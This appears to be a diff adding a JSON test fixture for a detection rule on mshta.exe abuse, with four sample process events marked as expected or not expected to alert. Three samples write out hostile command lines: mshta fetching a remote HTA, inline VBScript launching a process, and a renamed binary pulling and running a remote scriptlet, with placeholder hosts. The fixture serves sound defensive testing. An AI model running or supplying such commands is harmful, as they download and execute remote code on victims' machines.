@@ -1,0 +1,10 @@
+[
+  {"note": "Remote HTA",
+   "event": {"Image": "C:\\Windows\\System32\\mshta.exe", "CommandLine": "mshta.exe https://cdn.example.invalid/verify.hta"}, "expected": true},
+  {"note": "Inline vbscript",
+   "event": {"Image": "C:\\Windows\\SysWOW64\\mshta.exe", "CommandLine": "mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"calc\"\":close\")"}, "expected": true},
+  {"note": "Inline javascript via renamed binary",
+   "event": {"Image": "C:\\Users\\Public\\m.exe", "OriginalFileName": "MSHTA.EXE", "CommandLine": "m.exe javascript:a=GetObject('script:https://x.example.invalid/s.sct').Exec();close()"}, "expected": true},
+  {"note": "Local HTA from Program Files",
+   "event": {"Image": "C:\\Windows\\System32\\mshta.exe", "CommandLine": "mshta.exe \"C:\\Program Files\\Vendor\\setup.hta\""}, "expected": false}
+]
